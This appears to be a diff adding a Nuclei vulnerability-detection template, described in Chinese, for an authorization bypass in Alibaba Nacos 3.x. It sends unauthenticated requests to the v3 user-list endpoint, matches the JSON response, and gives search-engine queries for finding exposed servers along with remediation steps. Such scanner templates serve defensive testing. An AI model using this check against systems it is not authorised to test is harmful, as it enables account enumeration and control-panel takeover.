@@ -1,0 +1,56 @@
+id: nacos-v3-auth-user-list-unauth
+
+info:
+  name: Alibaba Nacos 3.x 权限绕过漏洞
+  author: dahe
+  severity: critical
+  description: |
+    Alibaba Nacos 3.0.0 至 3.2.3 版本中，`UserControllerV3.createUser()` 相关鉴权注解缺少 `apiType` 参数，导致用户管理接口的权限校验作用域错配。未授权攻击者可直接访问 v3 用户列表接口，枚举现有账号并为后续创建高权限账户、接管控制台提供入口。
+  impact: |
+    - 攻击者可在未登录状态下读取用户列表、账号数量等管理信息，扩大后续枚举与攻击面。
+    - 同类权限校验缺失通常意味着创建用户、分配权限等管理接口也可能被滥用，最终导致 Nacos 控制台和配置中心被接管。
+  remediation: |
+    - 升级到 Nacos 3.2.4 或更高版本，确认受影响接口的 `@Secured` 已补充 `apiType = ApiType.ADMIN_API`。
+    - 对 `/nacos/v3/auth/user/*` 等管理接口强制执行管理员鉴权，并通过网关、反向代理或访问控制策略限制暴露面。
+    - 修复后检查现有管理员账号、访问令牌和配置变更记录，发现异常立即轮换凭据并审计历史操作。
+  reference:
+    - https://github.com/alibaba/nacos/issues/10060
+    - https://github.com/alibaba/nacos/releases/tag/3.2.4
+    - https://nacos.io/zh-cn/docs/auth.html
+  classification:
+    cwe-id: CWE-306
+    cpe: cpe:2.3:a:alibaba:nacos:*:*:*:*:*:*:*:*
+  metadata:
+    max-request: 2
+    vendor: alibaba
+    product: nacos
+    shodan-query: title:"Nacos"
+    fofa-query: app="NACOS"
+  tags: nacos,unauth,auth-bypass,vuln
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/nacos/v3/auth/user/list?pageNo=1&pageSize=1"
+      - "{{BaseURL}}/v3/auth/user/list?pageNo=1&pageSize=1"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - application/json
+
+      - type: word
+        part: body
+        words:
+          - '"code":0'
+          - '"pageItems"'
+          - '"totalCount"'
+        condition: and
